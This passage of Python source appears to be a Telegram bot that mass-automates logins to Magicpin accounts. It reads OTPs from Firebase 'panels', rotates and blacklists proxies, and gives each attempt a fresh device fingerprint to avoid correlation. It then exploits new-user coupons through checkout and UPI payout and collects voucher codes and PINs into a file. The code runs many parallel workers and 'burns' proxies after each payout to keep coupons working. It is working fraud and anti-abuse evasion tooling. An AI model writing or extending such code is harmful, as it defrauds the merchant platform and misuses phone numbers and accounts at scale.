    # ── Pick best code from candidates ───────────────────────────────────────
    code = None
    if code_candidates:
        code_candidates.sort(key=lambda x: x[0], reverse=True)
        code = code_candidates[0][1]

    # ── Clean ─────────────────────────────────────────────────────────────────
    def _clean_code(x):
        if not x:
            return None
        s = str(x).strip()
        if not _looks_like_code(s):
            return None
        return s

    def _clean_pin(x):
        if not x:
            return None
        s = str(x).strip()
        if not _looks_like_pin(s):
            return None
        return s

    code = _clean_code(code)
    pin  = _clean_pin(pin)
    complete = bool(code and pin)   # both must be present for complete=True

    return {
        "merchant": merchant or "-",
        "value":    value    or "-",
        "code":     code     or "-",
        "pin":      pin      or "-",
        "pg_txn":   pg_txn,
        "complete": complete,
    }


def fetch_voucher_by_numeric(numeric, token: str, uid: str, pg_txn=None,
                             proxies=None, retries: int = 5,
                             retry_gap: float = 5.0) -> Optional[dict]:
    """
    Fetch voucher details for a transaction numeric ID.

    Returns a dict always — even when the code/pin haven't been assigned yet
    by Magicpin (the "generating" state).  Callers should check the
    `pending_generation` key to decide whether to schedule a background
    re-poll rather than showing a dash to the user.

    pending_generation=True  → Magicpin said "wait N minutes", code not ready
    complete=True            → code AND pin both present
    complete=False           → extraction failed or partial, not a generation delay
    """
    url = f"https://webapi.magicpin.in/txns/post-txn/voucher/{numeric}"
    last = None
    last_raw = None

    # Strings Magicpin returns when the code is being generated server-side
    _GENERATING_SIGNALS = (
        "generating", "being generated", "will be ready", "please wait",
        "wait for", "minutes", "processing", "in progress", "coming soon",
        "will be sent", "shortly",
    )

    for attempt in range(1, retries + 1):
        log.info(f"GET {url} (try {attempt}/{retries})")
        try:
            r = _req("GET", url, proxies=proxies, headers=_api_headers(token, uid),
                     timeout=25)
        except Exception as e:
            log.warning(f"voucher fetch error: {e}")
            time.sleep(retry_gap)
            continue
        log.info(f"HTTP {r.status_code}  len={len(r.text)}")
        if r.status_code != 200 or not r.text.strip():
            time.sleep(retry_gap)
            continue
        try:
            payload = r.json()
        except Exception:
            time.sleep(retry_gap)
            continue
        last_raw = payload

        # Check for "still generating" signal in the raw JSON blob
        raw_text = json.dumps(payload).lower()
        is_generating = any(sig in raw_text for sig in _GENERATING_SIGNALS)

        extracted = _extract_voucher(payload, pg_txn or str(numeric))
        extracted["pending_generation"] = False
        last = extracted

        if extracted and extracted.get("complete"):
            _append_voucher_record(extracted, raw=payload, numeric=numeric, uid=uid)
            return extracted

        # If Magicpin is still generating, mark it and return early —
        # no point hammering retries, the poller will handle it
        if is_generating and not extracted.get("complete"):
            log.info(f"Voucher {numeric} still being generated by Magicpin — flagging pending.")
            extracted["pending_generation"] = True
            return extracted

        time.sleep(retry_gap)

    if last:
        _append_voucher_record(last, raw=last_raw, numeric=numeric, uid=uid)
    return last


VOUCHERS_PATH = os.path.join(
    os.path.dirname(os.path.abspath(__file__)), "vouchers.json"
)


def _append_voucher_record(extracted: dict, raw: Optional[dict] = None,
                           numeric=None, uid: str = ""):
    try:
        records: list = []
        if os.path.isfile(VOUCHERS_PATH):
            try:
                with open(VOUCHERS_PATH, "r", encoding="utf-8") as f:
                    data = json.load(f)
                if isinstance(data, list):
                    records = data
                elif isinstance(data, dict) and isinstance(data.get("vouchers"), list):
                    records = data["vouchers"]
            except Exception:
                records = []
        entry = {
            "saved_at": time.strftime("%Y-%m-%d %H:%M:%S"),
            "numeric": numeric,
            "uid": uid,
            "merchant": extracted.get("merchant"),
            "value": extracted.get("value"),
            "code": extracted.get("code"),
            "pin": extracted.get("pin"),
            "pg_txn": extracted.get("pg_txn"),
        }
        # Deduplicate: remove existing records with same code+pin before inserting
        key = (entry.get("code"), entry.get("pin"))
        records = [
            x for x in records
            if (x.get("code"), x.get("pin")) != key
        ]
        records.insert(0, entry)
        with open(VOUCHERS_PATH, "w", encoding="utf-8") as f:
            json.dump(records[:500], f, indent=2)
    except Exception as e:
        log.warning(f"vouchers.json write failed: {e}")


def poll_new_voucher(token: str, uid: str, min_txn_id: int = 0,
                     poll_seconds: int = 180, interval: int = 4, proxies=None) -> Optional[int]:
    deadline = time.time() + poll_seconds
    while time.time() < deadline:
        numeric, _ = ledger_newest_voucher_txn(token, uid, min_txn_id=min_txn_id, proxies=proxies)
        if numeric:
            return numeric
        time.sleep(interval)
    return None


def make_qr_png(uri: str, path: str = "upi_qr.png") -> bool:
    try:
        import qrcode
        qr = qrcode.QRCode(border=2, box_size=10)
        qr.add_data(uri)
        qr.make(fit=True)
        img = qr.make_image(fill_color="black", back_color="white")
        img.save(path)
        return True
    except Exception as e:
        log.warning(f"qr image: {e}")
        return False


def make_qr_bytes(uri: str) -> Optional[io.BytesIO]:
    """Return a BytesIO PNG of the QR code, or None on failure.
    Used by upi_chosen_manual to send QR photo directly to Telegram."""
    try:
        import qrcode
        qr = qrcode.QRCode(border=2, box_size=10)
        qr.add_data(uri)
        qr.make(fit=True)
        img = qr.make_image(fill_color="black", back_color="white")
        buf = io.BytesIO()
        img.save(buf, format="PNG")
        buf.seek(0)
        return buf
    except Exception as e:
        log.warning(f"make_qr_bytes: {e}")
        return None


import queue as queue_mod


def _acquire_proxy_with_wait(tag: str, after: Optional[str] = None) -> Optional[str]:
    """
    Acquire a proxy from the pool, waiting up to 3 min if pool is temporarily
    exhausted (all locked by other workers). Returns None only if truly dead.
    """
    proxy = PROXY_POOL.acquire(after=after)
    if proxy is not None:
        return proxy
    log.warning(f"{tag} No proxy available — waiting for one to free up...")
    for _ in range(60):   # 60 × 3s = 3 min
        time.sleep(3)
        proxy = PROXY_POOL.acquire(after=None)
        if proxy is not None:
            return proxy
    log.warning(f"{tag} ❌ No proxy freed after 3 min.")
    return None


def _try_login_with_otp_rotating(phone, device_id, firebase_url, tag, max_attempts: int = 5):
    """
    OTP login with automatic proxy rotation.

    Retry model (per attempt = one OTP send):
      - rate_limited / otp_send_failed  → blacklist proxy, rotate, retry OTP send
      - otp_not_received                → phone is dead, mark used, STOP immediately
      - login_verify_failed             → retry login up to 3x with the SAME OTP
                                          before giving up on this attempt entirely.
                                          Do NOT send a new OTP — the old one is still
                                          valid on Magicpin for a few minutes and a
                                          second OTP send can lock the number.

    Proxy rotation fix:
      last_otp_proxy tracks the most recently BLACKLISTED proxy so the next
      acquire(after=...) call skips it correctly. Setting otp_proxy=None on
      failure and then passing after=otp_proxy broke rotation (always got
      a random proxy instead of the next one in the ring).
    """
    phone = normalize_phone(phone)

    # Stale-bad-entry guard — flush temp cooldowns if everything is blacklisted
    if not PROXY_POOL.all_good():
        log.warning(f"{tag} All proxies blacklisted at attempt start — flushing cooldowns.")
        with PROXY_POOL._lock:
            PROXY_POOL._bad.clear()

    last_err        = "All attempts exhausted"
    last_bad_proxy  = None   # tracks the last blacklisted proxy for rotation ring

    for attempt in range(1, max_attempts + 1):

        # Fresh device fingerprint every attempt — prevents server fingerprint correlation
        device = generate_device(phone, fresh=True)

        # ── Acquire OTP proxy ────────────────────────────────────────────────
        otp_proxy = _acquire_proxy_with_wait(tag, after=last_bad_proxy)
        if otp_proxy is None:
            return None, None, generate_device(phone, fresh=True), "proxy_pool_exhausted", None

        otp_proxies = proxy_dict(otp_proxy)
        otp_label   = otp_proxy[:50]
        log.info(f"{tag} attempt {attempt}/{max_attempts} | phone={phone} | otp_proxy={otp_label}")

        # ── Send OTP ─────────────────────────────────────────────────────────
        success, rate_limited, fingerprint = send_otp(phone, {}, proxies=otp_proxies)

        if rate_limited:
            log.warning(f"{tag} Rate-limited on {otp_label} — blacklisting.")
            PROXY_POOL.mark_bad(otp_proxy, "max rate limit breached")
            last_err       = "rate_limited"
            last_bad_proxy = otp_proxy   # rotation ring: skip this one next time
            time.sleep(random.uniform(2.0, 6.0))
            continue

        if not success:
            log.warning(f"{tag} OTP send failed on {otp_label} — blacklisting.")
            PROXY_POOL.mark_bad(otp_proxy, "otp send failed")
            last_err       = "otp_send_failed"
            last_bad_proxy = otp_proxy
            time.sleep(random.uniform(1.0, 3.0))
            continue

        # ── Poll Firebase for OTP ────────────────────────────────────────────
        otp = None
        if firebase_url and device_id:
            log.info(f"{tag} Polling OTP from Firebase (timeout={OTP_WAIT_SECONDS}s)…")
            try:
                otp = poll_otp_from_panel(firebase_url, device_id, timeout=OTP_WAIT_SECONDS)
            except Exception as e:
                log.warning(f"{tag} OTP poll error: {e}")

        if not otp:
            # 30 s window already elapsed — device never surfaced the SMS.
            # Sending another OTP to the same number won't help and may lock it.
            log.warning(
                f"{tag} OTP not received after {OTP_WAIT_SECONDS}s — "
                f"marking phone used, stopping all retries."
            )
            mark_used_persistent(phone)
            PROXY_POOL.release(otp_proxy)
            last_err = "otp_not_received"
            break   # phone is done — no further attempts

        # ── Acquire login proxy (different IP from OTP send) ─────────────────
        login_proxy = _acquire_proxy_with_wait(tag, after=otp_proxy)
        if login_proxy is None:
            # Pool truly dead — fall back to same proxy rather than abort
            log.warning(f"{tag} Login proxy unavailable — reusing OTP proxy as fallback.")
            login_proxy = otp_proxy
        login_proxies = proxy_dict(login_proxy)
        login_label   = login_proxy[:50]
        log.info(f"{tag} OTP received — logging in | login_proxy={login_label}")

        # ── Single login attempt with the fresh OTP ──────────────────────────
        # One shot — if it fails, release locks and let the outer loop send a
        # completely fresh OTP on the next attempt. Never reuse an old OTP.
        d = login(phone, otp, base_headers(), device,
                  proxies=login_proxies, fingerprint=fingerprint)
        if d and d.get("status") == "SUCCESS" and d.get("access_token"):
            token = d["access_token"]
            uid   = str(d["user_id"])
            p_num = d.get("phone_number") or phone
            log.info(f"{tag} ✅ Login SUCCESS phone={p_num} | login_proxy={login_label}")
            PROXY_POOL.release(otp_proxy)
            PROXY_POOL.release(login_proxy)
            return token, uid, device, p_num, login_proxy

        err = (d or {}).get("_error") or (d or {}).get("message") or "Login failed"
        log.warning(f"{tag} Login failed: {err} — releasing locks, will send fresh OTP next attempt.")

        # Release both locks — next loop iteration sends a brand new OTP
        PROXY_POOL.release(otp_proxy)
        PROXY_POOL.release(login_proxy)
        last_err       = "login_verify_failed"
        last_bad_proxy = login_proxy
        time.sleep(random.uniform(1.5, 4.0))

    log.warning(f"{tag} ❌ All {max_attempts} attempts failed. Last: {last_err}")
    return None, None, generate_device(phone, fresh=True), last_err, None


def worker_mode1_from_queue(phone_q: "queue_mod.Queue", proxy: Optional[str],
                            worker_id: int) -> dict:
    tag = f"[W{worker_id}]"
    last_msg = "No phones left"
    tried = 0

    while True:
        try:
            phone, device_id, firebase_url = phone_q.get_nowait()
        except queue_mod.Empty:
            return {
                "worker": worker_id, "phone": "-", "proxy": None,
                "ok": False, "msg": last_msg, "tried": tried,
            }

        tried += 1

        if PROXY_POOL.is_pool_exhausted():
            log.warning(f"{tag} Pool exhausted — waiting for locked proxy to free up...")
            freed = False
            for _ in range(60):
                time.sleep(3)
                if not PROXY_POOL.is_pool_exhausted():
                    freed = True
                    break
            if not freed:
                phone_q.put((phone, device_id, firebase_url))
                log.warning(f"{tag} 🛑 No proxy freed — returning phone to queue, stopping worker.")
                return {
                    "worker": worker_id, "phone": "-", "proxy": None,
                    "ok": False, "msg": "🛑 All proxies used up — add new proxies and restart.",
                    "upi_uri": None, "txn": None, "tried": tried, "pool_exhausted": True,
                }

        result = _try_login_with_otp_rotating(phone, device_id, firebase_url, tag)
        token, uid, device, info = result[0], result[1], result[2], result[3]
        login_proxy = result[4] if len(result) > 4 else None

        if token is None:
            if info == "proxy_pool_exhausted":
                phone_q.put((phone, device_id, firebase_url))
                return {
                    "worker": worker_id, "phone": "-", "proxy": None,
                    "ok": False, "msg": "🛑 All proxies used up — add new proxies and restart.",
                    "upi_uri": None, "txn": None, "tried": tried, "pool_exhausted": True,
                }
            last_msg = f"{info} (phone {phone})"
            continue

        phone = info
        proxies = proxy_dict(login_proxy or PROXY_POOL.next_after(None))
        try:
            numeric, _ = ledger_newest_voucher_txn(
                token, uid, min_txn_id=0, proxies=proxies
            )
            if not numeric:
                last_msg = "No BOUGHT voucher in ledger"
                continue
            voucher = fetch_voucher_by_numeric(numeric, token, uid, proxies=proxies)
            if not voucher:
                last_msg = "Voucher fetch failed"
                continue
            return {
                "worker": worker_id, "phone": phone, "proxy": login_proxy or "rotated",
                "ok": True, "msg": "OK", "voucher": voucher, "tried": tried,
            }
        except Exception as e:
            last_msg = f"Exception: {e}"
            continue


def worker_mode2_from_queue(phone_q: "queue_mod.Queue", proxy: Optional[str],
                            instrument: str, worker_id: int) -> dict:
    tag = f"[W{worker_id}]"
    last_msg = "No phones left"
    tried = 0

    while True:
        try:
            phone, device_id, firebase_url = phone_q.get_nowait()
        except queue_mod.Empty:
            return {
                "worker": worker_id, "phone": "-", "proxy": None,
                "ok": False, "msg": last_msg, "upi_uri": None, "txn": None,
                "tried": tried,
            }

        tried += 1
        panel_device_id = device_id
        panel_firebase = firebase_url

        # Pool exhaustion guard — wait up to 3 minutes for a locked proxy
        # to free up before giving the phone number back and dying.
        # This prevents workers from burning phone numbers when no proxy is
        # available yet (e.g. other workers are mid-login).
        if PROXY_POOL.is_pool_exhausted():
            log.warning(f"{tag} Pool exhausted — waiting for locked proxy to free up...")
            freed = False
            for _ in range(60):   # 60 × 3s = 3 min
                time.sleep(3)
                if not PROXY_POOL.is_pool_exhausted():
                    freed = True
                    break
            if not freed:
                # Put the phone back so it's not wasted
                phone_q.put((phone, device_id, firebase_url))
                log.warning(f"{tag} 🛑 No proxy freed — returning phone to queue, stopping worker.")
                return {
                    "worker": worker_id, "phone": "-", "proxy": None,
                    "ok": False, "msg": "🛑 All proxies used up — add new proxies and restart.",
                    "upi_uri": None, "txn": None, "tried": tried, "pool_exhausted": True,
                }

        result = _try_login_with_otp_rotating(phone, device_id, firebase_url, tag)
        token, uid, device, info = result[0], result[1], result[2], result[3]
        login_proxy = result[4] if len(result) > 4 else None

        if token is None:
            if info == "proxy_pool_exhausted":
                return {
                    "worker": worker_id, "phone": "-", "proxy": None,
                    "ok": False, "msg": "🛑 All proxies used up — add new proxies and restart.",
                    "upi_uri": None, "txn": None, "tried": tried, "pool_exhausted": True,
                }
            last_msg = f"{info} (phone {phone})"
            continue

        phone = info
        # Use the same proxy that did the login for all subsequent API calls
        # This keeps the full flow on one IP until payout
        proxies = proxy_dict(login_proxy or PROXY_POOL.next_after(None))

        # Always visible — even if something below throws
        log.info(f"{tag} phone     : {phone}")
        log.info(f"{tag} firebase  : {panel_firebase}")
        log.info(f"{tag} device_id : {panel_device_id}")

        try:
            cards_before = list_saved_card_ids(token, uid, proxies=proxies)

            # ── Ledger scan — keep raw count for coupon-rejection detection ──
            ledger_cards = ledger_all_voucher_cards(token, uid, proxies=proxies)
            ledger_card_count = len(ledger_cards)
            base_txn_id = 0
            if ledger_cards:
                best_id = -1
                for _c in ledger_cards:
                    if _c.get("txn_status") != "BOUGHT":
                        continue
                    try:
                        _tid = int(_c.get("transaction_id"))
                        if _tid > best_id:
                            best_id = _tid
                    except (TypeError, ValueError):
                        continue
                if best_id > 0:
                    base_txn_id = best_id

            _, pg_amt = checkout(
                phone, token, uid, FIRST_NAME, EMAIL, device, proxies=proxies
            )
            if pg_amt is None:
                last_msg = "Checkout failed"
                continue

            # ── Coupon not applied (pgAmt >= 5) ─────────────────────────────
            if pg_amt >= 5.0:
                # Case A: account has prior vouchers → legitimately ineligible.
                #         Burn proxy + mark used, move on.
                if ledger_card_count > 0:
                    log.info(
                        f"{tag} pgAmt={pg_amt} ledger={ledger_card_count} — "
                        f"account already used vouchers, coupon unavailable. "
                        f"Burning proxy & marking used."
                    )
                    PROXY_POOL.mark_payout_burned(login_proxy)
                    mark_used_persistent(phone)
                    last_msg = f"Coupon not applied (pgAmt=₹{pg_amt:.2f}, ledger={ledger_card_count})"
                    continue

                # Case B: ledger == 0 → fresh account, coupon SHOULD apply.
                # The proxy we got was already payout-burned on a previous run.
                # Fix: burn this proxy, re-login the SAME number on a clean proxy.
                log.warning(
                    f"{tag} pgAmt={pg_amt} BUT ledger=0 — fresh account, "
                    f"proxy was already burned! Burning proxy, re-logging {phone}…"
                )
                PROXY_POOL.mark_payout_burned(login_proxy)
                # Do NOT mark number used — still eligible on a clean proxy

                # ── Re-login same number on a fresh proxy ────────────────────
                retry_result = _try_login_with_otp_rotating(
                    phone, panel_device_id, panel_firebase, tag, max_attempts=5
                )
                r_token      = retry_result[0]
                r_uid        = retry_result[1]
                r_device     = retry_result[2]
                r_info       = retry_result[3]
                r_login_proxy = retry_result[4] if len(retry_result) > 4 else None

                if r_token is None:
                    log.warning(f"{tag} Re-login failed for {phone}: {r_info}")
                    _safe_sync_send(
                        BATCH.get("chat_id") or ALLOWED_CHAT,
                        f"⚠️ <b>Manual needed</b>\n"
                        f"📱 <code>{phone}</code>\n"
                        f"🆔 Device ID: <code>{panel_device_id}</code>\n"
                        f"Ledger=0 but coupon failed — re-login also failed: <code>{r_info}</code>\n"
                        f"🔥 Firebase: <code>{panel_firebase}</code>",
                        parse_mode="HTML",
                    )
                    last_msg = f"Re-login failed after proxy-burn retry ({r_info})"
                    continue

                # Re-login OK — retry checkout on the fresh proxy
                r_phone   = r_info
                r_proxies = proxy_dict(r_login_proxy or PROXY_POOL.next_after(None))
                log.info(f"{tag} Re-login OK for {r_phone} — retrying checkout on fresh proxy…")

                _, r_pg_amt = checkout(
                    r_phone, r_token, r_uid, FIRST_NAME, EMAIL, r_device,
                    proxies=r_proxies
                )

                if r_pg_amt is None or r_pg_amt >= 5.0:
                    # Retry also failed — manual alert, don't mark used
                    log.warning(
                        f"{tag} Retry pgAmt={r_pg_amt} — coupon STILL not applying "
                        f"for {r_phone} on fresh proxy. Sending manual alert."
                    )
                    PROXY_POOL.mark_payout_burned(r_login_proxy)
                    _safe_sync_send(
                        BATCH.get("chat_id") or ALLOWED_CHAT,
                        f"⚠️ <b>Manual needed</b>\n"
                        f"📱 <code>{r_phone}</code>\n"
                        f"🆔 Device ID: <code>{panel_device_id}</code>\n"
                        f"Ledger=0, tried 2 proxies — pgAmt still ₹{r_pg_amt}.\n"
                        f"Account is eligible but coupon won't apply automatically.\n"
                        f"🔥 Firebase: <code>{panel_firebase}</code>",
                        parse_mode="HTML",
                    )
                    last_msg = f"Coupon retry failed (pgAmt=₹{r_pg_amt}) — manual alert sent"
                    continue

                # ✅ Fresh proxy fixed it — swap session context and fall through
                log.info(f"{tag} ✅ Fresh proxy retry worked! pgAmt=₹{r_pg_amt} for {r_phone}")
                token        = r_token
                uid          = r_uid
                device       = r_device
                phone        = r_phone
                pg_amt       = r_pg_amt
                login_proxy  = r_login_proxy
                proxies      = r_proxies
                # cards_before already set earlier — no need to re-fetch here
                # Fall through to payoutapp with corrected context

            txn = payoutapp(
                phone, token, uid, FIRST_NAME, EMAIL, amount=pg_amt,
                device=device, proxies=proxies,
            )
            if not txn:
                last_msg = "Payoutapp failed"
                continue

            # ── BURN PROXY + MARK NUMBER USED — payoutapp is point of no return ──
            log.info(f"{tag} 🔥 Payoutapp hit — burning proxy {(login_proxy or '')[:50]} permanently")
            PROXY_POOL.mark_payout_burned(login_proxy)
            mark_used_persistent(phone)  # number is done — payout reached

            _instruments_to_try = [instrument] + [
                i for i in ["Phonepe", "paytm", "gpay"] if i != instrument
            ]
            uri = None
            used_instrument = instrument
            for _inst in _instruments_to_try:
                uri = initiate_upi(
                    txn, uid, phone, EMAIL, amount=pg_amt,
                    instrument=_inst, proxies=proxies,
                )
                if uri:
                    used_instrument = _inst
                    break
                log.warning(f"{tag} UPI instrument {_inst} returned no URI — trying next")

            if not uri:
                last_msg = "No UPI URI (all instruments failed)"
                continue

            return {
                "worker": worker_id, "phone": phone, "proxy": login_proxy or "rotated",
                "ok": True, "msg": "UPI ready", "upi_uri": uri, "txn": txn,
                "token": token, "uid": uid, "pg_amt": pg_amt,
                "cards_before": list(cards_before), "base_txn_id": base_txn_id,
                "proxies": proxies,
                "instrument": used_instrument, "tried": tried,
                "device_id": panel_device_id,
                "firebase_url": panel_firebase,
            }
        except Exception as e:
            last_msg = f"Exception: {e}"
            continue


def allowed(update: Update) -> bool:
    chat = update.effective_chat
    if not chat:
        return False
    if ALLOWED_CHAT_IDS:
        return chat.id in ALLOWED_CHAT_IDS
    # If no IDs configured, deny everyone (bot is not set up)
    return False


def main_keyboard() -> InlineKeyboardMarkup:
    n_sess = len(load_sessions())
    return InlineKeyboardMarkup([
        [
            InlineKeyboardButton("1️⃣ Fetch Voucher", callback_data="mode_1"),
            InlineKeyboardButton("2️⃣ Full Pay Flow", callback_data="mode_2"),
        ],
        [
            InlineKeyboardButton("⚙️ Set Workers", callback_data="set_workers"),
            InlineKeyboardButton(f"💾 Saved ({n_sess})", callback_data="show_saved"),
        ],
        [
            InlineKeyboardButton("📋 Status", callback_data="status"),
            InlineKeyboardButton("🗑 Clear Saved", callback_data="clear_sessions"),
        ],
        [
            InlineKeyboardButton("➕ Add Proxy", callback_data="add_proxy"),
            InlineKeyboardButton("🗑 Clear Proxies", callback_data="clear_proxy"),
        ],
        [
            InlineKeyboardButton("🔄 Reset Proxy Bans", callback_data="reset_proxy_bans"),
            InlineKeyboardButton("🔥 Add Firebase Panel(s)", callback_data="set_firebase"),
        ],
        [
            InlineKeyboardButton("🗑 Clear Firebase", callback_data="clear_firebase"),
        ],
    ])


def status_text(max_panels: int = 5) -> str:
    n_proxy = len(RUNTIME["proxies"])
    n_workers = RUNTIME.get("workers", 3)
    n_sess = len(load_sessions())
    n_used = len(load_used_numbers())
    urls = RUNTIME["firebase_urls"]
    n_fb = len(urls)
    if n_fb == 0:
        fb_line = "🔥 Firebase panels: <b>0</b> (not set)"
    else:
        lines = [f"🔥 Firebase panels: <b>{n_fb}</b>"]
        show = urls[:max_panels]
        for i, u in enumerate(show, 1):
            short = u[:45] + ("…" if len(u) > 45 else "")
            lines.append(f"   {i}. <code>{short}</code>")
        if n_fb > max_panels:
            lines.append(f"   … and <b>{n_fb - max_panels}</b> more")
        fb_line = "\n".join(lines)
    text = (
        f"📊 <b>Status</b>\n\n"
        f"⚙ Workers (parallel): <b>{n_workers}</b>\n"
        f"🔀 Proxies loaded: <b>{n_proxy}</b>\n"
        f"🚫 Used numbers saved: <b>{n_used}</b>\n"
        f"💾 Saved sessions: <b>{n_sess}</b>\n"
        f"{fb_line}\n"
        f"💳 UPI: auto PhonePe / Paytm"
    )
    if len(text) > 3500:
        text = text[:3400] + "\n… (truncated)"
    return text


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    if not allowed(update):
        await update.message.reply_text("⛔ Unauthorized.")
        return ConversationHandler.END

    context.user_data.clear()
    await update.message.reply_text(
        "🚀 <b>Magicpin Bot (FinFin Engine)</b>\n\n"
        "• Mode 1 – login → fetch voucher\n"
        "• Mode 2 – full pay → UPI QR\n"
        "• Persistent used_numbers.txt support\n"
        "• Automatic Proxy Rotation on Rate-limit\n\n"
        + status_text(),
        parse_mode="HTML",
        reply_markup=main_keyboard(),
    )
    return MAIN_MENU


async def main_menu_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    query = update.callback_query
    await query.answer()
    if not allowed(update):
        return ConversationHandler.END

    data = query.data

    if data == "status":
        await query.edit_message_text(
            status_text(),
            parse_mode="HTML",
            reply_markup=main_keyboard(),
        )
        return MAIN_MENU

    if data == "show_saved":
        sessions = load_sessions()
        if not sessions:
            await query.edit_message_text(
                "💾 No saved sessions yet.\n"
                "They appear when a payment QR is generated.",
                reply_markup=main_keyboard(),
            )
            return MAIN_MENU
        await query.edit_message_text(
            f"💾 <b>Saved sessions</b> ({len(sessions)})\nTap one:",
            parse_mode="HTML",
            reply_markup=_sessions_keyboard(0),
        )
        return MAIN_MENU

    if data == "clear_sessions":
        save_sessions([])
        await query.edit_message_text(
            "🗑 All saved sessions cleared.\n\n" + status_text(),
            parse_mode="HTML",
            reply_markup=main_keyboard(),
        )
        return MAIN_MENU

    if data == "add_proxy":
        await query.edit_message_text(
            "➕ <b>Add Proxies</b>\n\n"
            "Send proxies (one per line or comma-separated).\n"
            "Formats:\n"
            "• <code>host:port</code>\n"
            "• <code>user:pass@host:port</code>\n"
            "• <code>http://user:pass@host:port</code>\n\n"
            "Send /cancel to abort.",
            parse_mode="HTML",
        )
        return ADDING_PROXY

    if data == "clear_proxy":
        RUNTIME["proxies"] = []
        PROXY_POOL.full_reset()   # FIX: wipe in-memory blacklist when proxies are cleared
        save_config()
        await query.edit_message_text(
            "🗑 All proxies cleared + ban list wiped.\n\n" + status_text(),
            parse_mode="HTML",
            reply_markup=main_keyboard(),
        )
        return MAIN_MENU

    if data == "reset_proxy_bans":
        # Only clear TEMP blacklist (_bad) — never touch burned proxies.
        # Burned proxies reached payout on this IP — reusing them silently
        # kills coupons on MagicPin. They stay burned until bot restarts.
        with PROXY_POOL._lock:
            cleared = len(PROXY_POOL._bad)
            PROXY_POOL._bad.clear()
        log.info(f"🔄 Proxy temp-bans cleared ({cleared} entries). Burned proxies preserved.")
        await query.edit_message_text(
            f"🔄 <b>Proxy temp-ban list wiped.</b>\n"
            f"<i>({cleared} cooldown entries removed)</i>\n\n"
            f"⚠️ Payout-burned proxies are <b>NOT</b> restored — "
            f"they stay retired to protect coupon eligibility.\n\n"
            + status_text(),
            parse_mode="HTML",
            reply_markup=main_keyboard(),
        )
        return MAIN_MENU

    if data == "clear_firebase":
        RUNTIME["firebase_urls"] = []
        save_config()
        await query.edit_message_text(
            "🗑 All Firebase panels cleared.\n\n" + status_text(),
            parse_mode="HTML",
            reply_markup=main_keyboard(),
        )
        return MAIN_MENU

    if data == "set_firebase":
        await query.edit_message_text(
            "🔥 <b>Add Firebase Panel(s)</b>\n\n"
            "Paste one or more panel links <b>(one per line)</b>.\n"
            "Accepts firebaseio.com / firebasedatabase.app links.\n\n"
            "Send /cancel to abort.",
            parse_mode="HTML",
        )
        return SETTING_FIREBASE

    if data == "set_workers":
        await query.edit_message_text(
            f"⚙️ <b>Set Workers</b>\n\n"
            f"Current: <b>{RUNTIME.get('workers', 3)}</b>\n\n"
            "How many processes to run <b>in parallel</b> at once?\n"
            "(Reply with a number 1–50, e.g. <code>5</code>)\n\n"
            "Send /cancel to abort.",
            parse_mode="HTML",
        )
        return SETTING_WORKERS

    if data in ("mode_1", "mode_2"):
        context.user_data["mode"] = 1 if data == "mode_1" else 2
        n_proxy = len(RUNTIME["proxies"])
        n_fb = len(RUNTIME["firebase_urls"])
        n_workers = RUNTIME.get("workers", 3)

        await query.edit_message_text(
            f"✅ Mode <b>{context.user_data['mode']}</b>\n\n"
            f"⚙️ Parallel workers: <b>{n_workers}</b>\n"
            f"🔀 Proxies: <b>{n_proxy}</b>\n"
            f"🔥 Panels: <b>{n_fb}</b>\n\n"
            "How many to process <b>in total</b>?\n"
            "(Reply with a number, e.g. <code>20</code>)",
            parse_mode="HTML",
        )
        return WAITING_TARGET

    return MAIN_MENU


async def receive_proxies(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    if not allowed(update):
        return ConversationHandler.END

    text = update.message.text or ""
    new = parse_proxy_list(text)
    if not new:
        await update.message.reply_text("❌ No valid proxies found. Try again or /cancel.")
        return ADDING_PROXY

    # FIX: flush blacklist entries for ALL currently-loaded proxies before
    # extending the list. The user is replacing them with fresh ones, so any
    # stale in-memory ban entries for the old strings must be wiped — otherwise
    # new proxies that happen to share a string (or old ones re-added) would
    # still be refused by the ProxyPool even though they're brand new.
    old_proxies = list(RUNTIME.get("proxies") or [])
    PROXY_POOL.flush_bad_for(old_proxies)

    RUNTIME["proxies"].extend(new)
    seen = set()
    unique = []
    for p in RUNTIME["proxies"]:
        if p not in seen:
            seen.add(p)
            unique.append(p)
    RUNTIME["proxies"] = unique
    save_config()

    flushed_msg = f" (blacklist flushed for {len(old_proxies)} old entries)" if old_proxies else ""
    await update.message.reply_text(
        f"✅ Added <b>{len(new)}</b> proxy(ies){flushed_msg}.\n"
        f"Total now: <b>{len(RUNTIME['proxies'])}</b>\n\n"
        + status_text(),
        parse_mode="HTML",
        reply_markup=main_keyboard(),
    )
    return MAIN_MENU


async def receive_firebase(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    if not allowed(update):
        return ConversationHandler.END

    text = (update.message.text or "").strip()
    raw_lines = re.split(r"[\n,;]+", text)
    added = []
    failed = 0
    for line in raw_lines:
        line = line.strip()
        if not line:
            continue
        url = parse_panel_link(line)
        if url:
            added.append(url)
        else:
            failed += 1

    if not added:
        await update.message.reply_text(
            "❌ Could not parse any Firebase URL.\n"
            "Send valid panel link(s), one per line, or /cancel."
        )
        return SETTING_FIREBASE

    RUNTIME["firebase_urls"].extend(added)
    seen = set()
    unique = []
    for u in RUNTIME["firebase_urls"]:
        if u not in seen:
            seen.add(u)
            unique.append(u)
    RUNTIME["firebase_urls"] = unique
    save_config()

    show = added[:5]
    list_lines = []
    for i, url in enumerate(show, 1):
        short = url[:45] + ("…" if len(url) > 45 else "")
        list_lines.append(f"  {i}. <code>{short}</code>")

    msg = (
        f"✅ Added <b>{len(added)}</b> panel(s)"
        + (f" ({failed} failed to parse)" if failed else "")
        + f"\nTotal panels: <b>{len(RUNTIME['firebase_urls'])}</b>\n\n"
        + "\n".join(list_lines)
        + "\n\n" + status_text()
    )
    await update.message.reply_text(
        msg, parse_mode="HTML", reply_markup=main_keyboard()
    )
    return MAIN_MENU


async def receive_workers(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    if not allowed(update):
        return ConversationHandler.END
    text = (update.message.text or "").strip()
    try:
        n = int(text)
        if n < 1 or n > 50:
            raise ValueError
    except ValueError:
        await update.message.reply_text("❌ Enter a number between 1 and 50:")
        return SETTING_WORKERS
    RUNTIME["workers"] = n
    save_config()
    await update.message.reply_text(
        f"✅ Workers set to <b>{n}</b>\n\n" + status_text(),
        parse_mode="HTML",
        reply_markup=main_keyboard(),
    )
